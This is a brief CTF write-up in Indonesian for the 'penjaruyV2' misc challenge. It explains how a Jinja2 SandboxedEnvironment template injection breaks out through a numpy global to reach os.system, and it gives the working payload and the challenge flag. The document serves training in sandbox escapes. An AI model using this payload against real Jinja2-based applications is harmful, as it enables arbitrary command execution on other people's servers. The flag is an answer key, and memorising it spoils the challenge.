# penjaruyV2
> Category: misc
> Author: 2byte

## Description
aku suka main penjara - penjaraan yang lebih brutal

## PoC
1. app menerima input user dan render langsung ke `jinja2.sandbox.SandboxedEnvironment` → SSTI
2. akses `os` lewat numpy karena diexpose sebagai global `numpy.f2py.crackfortran.os`
3. bikin string `/fix HELP` : `/` dari `os.sep`, `fix ` dari `str(numpy.fix)[11:15]`, `HELP` dari `numpy.base_repr(812077,36)`
4. binary `/fix` jalanin `cat /root/flag.txt` kalo argumen pertama = help
5. final payload:
```python
{%set o=numpy.f2py.crackfortran.os%}{{o.system(o.sep~(o.sep~numpy.fix)[11:15]~numpy.base_repr(812077,36))}}
```

## Flag
```
PorosCTF{tolong_yang_lebih_brutal_dan_menantang_lagi_dong_dipenjaranya}
```

## Hints
1. kalo ada
2. kalo ada
3. kalo ada# misc-penjaruyV1